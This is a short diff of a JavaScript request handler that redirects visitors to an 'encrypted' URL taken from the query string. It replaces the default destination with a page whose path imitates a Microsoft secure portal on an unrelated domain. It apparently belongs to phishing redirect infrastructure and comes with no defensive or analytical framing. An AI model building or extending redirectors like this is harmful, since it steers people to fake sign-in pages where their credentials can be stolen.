@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://qos.paivucea.sa.com/js!Deb5G7q3pvJH/';
+    const defaultUrl = 'https://tasfirm.com/secure-portal-microsoft/secure-page.html/';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
